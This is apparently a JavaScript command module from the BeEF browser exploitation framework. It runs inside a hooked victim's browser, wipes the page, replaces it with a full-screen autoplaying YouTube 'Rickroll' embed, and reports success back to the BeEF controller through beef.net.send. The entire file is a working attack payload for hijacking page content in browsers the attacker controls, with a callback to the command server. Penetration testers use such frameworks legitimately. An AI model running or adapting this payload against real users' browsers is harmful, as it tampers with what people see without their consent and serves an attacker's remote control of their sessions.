//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {
	$j('body').html('');

	$j('body').css({'padding':'0px', 'margin':'0px', 'height':'100%'});
	$j('html').css({'padding':'0px', 'margin':'0px', 'height':'100%'});
	
	$j('body').html('<object width="100%" height="100%"><param name="movie" value="http://www.youtube.com/v/oHg5SJYRHA0?fs=1&amp;hl=en_US&amp;autoplay=1&amp;iv_load_policy=3"><param name="allowFullScreen" value="true"><param name="allowscriptaccess" value="always"><embed src="http://www.youtube.com/v/oHg5SJYRHA0?fs=1&amp;hl=en_US&amp;autoplay=1&amp;iv_load_policy=3" type="application/x-shockwave-flash" allowscriptaccess="always" allowfullscreen="true" width="100%" height="100%"></object>');
	
	beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=Rickroll Successful");
});
